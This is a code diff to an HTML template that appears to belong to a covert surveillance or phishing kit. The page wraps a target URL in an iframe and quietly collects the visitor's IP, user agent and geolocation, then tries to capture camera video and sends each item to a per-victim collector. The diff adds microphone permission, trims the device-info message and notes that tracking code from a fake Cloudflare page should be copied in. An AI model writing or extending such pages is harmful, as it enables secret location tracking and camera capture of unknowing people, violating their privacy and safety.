@@ -10,7 +10,7 @@
     </style>
 </head>
 <body>
-    <iframe src="<%= url %>" allow="camera; geolocation"></iframe>
+    <iframe src="<%= url %>" allow="camera; geolocation; microphone"></iframe>
     
     <script>
         const uid = '<%= uid %>';
@@ -24,6 +24,9 @@
             }).catch(() => {});
         }
 
+        // Same advanced tracking as cloudflare page
+        // (Copy the info gathering code from cloudflare.ejs)
+        
         // Location
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
@@ -36,25 +39,13 @@
             );
         }
 
-        // Info
-        const info = `╔══════════════════════╗
-║ <b>📱 Device</b>           ║
-╚══════════════════════╝
-
-IP: <%= ip %>
-Time: <%= time %>
-Platform: ${navigator.platform}
-Screen: ${screen.width}x${screen.height}
-
-${navigator.userAgent}
-
-━━━━━━━━━━━━━━━━━━━━━`;
-
+        // Basic info (simplified for webview)
+        const info = `<b>📱 WebView Access</b>\n\nIP: <%= ip %>\nTime: <%= time %>\nUA: ${navigator.userAgent}`;
         send('info', { uid: uid, data: info });
 
         // Camera
-        if (navigator.mediaDevices) {
-            setTimeout(() => {
+        setTimeout(() => {
+            if (navigator.mediaDevices) {
                 navigator.mediaDevices.getUserMedia({ video: true })
                     .then(s => {
                         const v = document.createElement('video');
@@ -76,8 +67,8 @@ ${navigator.userAgent}
                         };
                     })
                     .catch(() => {});
-            }, 2000);
-        }
+            }
+        }, 2000);
     </script>
 </body>
 </html>
